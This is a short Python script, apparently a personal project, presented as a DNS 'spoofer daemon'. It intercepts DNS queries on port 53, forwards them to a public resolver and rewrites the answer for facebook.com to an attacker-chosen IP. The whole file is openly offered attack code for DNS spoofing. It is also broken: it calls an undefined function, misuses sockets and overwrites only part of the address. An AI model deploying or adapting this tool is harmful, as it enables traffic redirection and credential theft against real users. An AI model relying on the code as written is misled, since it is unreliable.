"""
    Spoofer Deamon
    
    A python deamon that listens on port 53 (DNS Port), captures requests,
    sends them to a DNS server and returns a modified response if a targeted
    domain is in the request (target domain name) or if not an sends an
    unmodified response as got from the DNS server.
    (Targeted IP Spoofing)
    
    Note: Requires special permission to run on port 53
    
    (C) 2018 Abishek V Ashok. All rights reserved.
"""

import binascii
import socket
import time

domain_to_watch = "facebook.com"
desired_ip = "7F858585" #
dns_server = "8.8.4.4"
# This is the port that we will be connecting on to on dns_server
dns_server_port = 53

def send_udp_message(message, address, port):
    """
        send_udp_message sends a message to UDP server port: port
        at ip address:address and returns a decoded response
    """
    message = message.replace(" ", "").replace("\n", "")
    server_address = (address, port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(binascii.unhexlify(message), server_address)
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()
    return binascii.hexlify(data).decode("utf-8")

def modify(response):
    """ 
        Modify modifies the response and changes the ip address
        in the resonse to desired_ip
    """
    modified_response = response[:-4] + desired_ip
    modified_response = format_hex(modified_response)
    return modified_response

def main():
    """
        Startup the server and start listening at port no: 53.
        Sends a modified response if the DNS request was for the
        target_domain or else send an umodified response as got from
        the DNS server
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 53))
    server_socket.listen(5)
    conn, addr = server_socket.accept()

    # infinite loop
    while 1:
        data = server_socket.recv(512).decode("utf-8")
        response = send_udp_message(data, dns_server, dns_server_port)
        if(domain_to_watch in data):
            response = modify(response)
        server_socket.send(response)

if __name__ == "__main__":
    main()
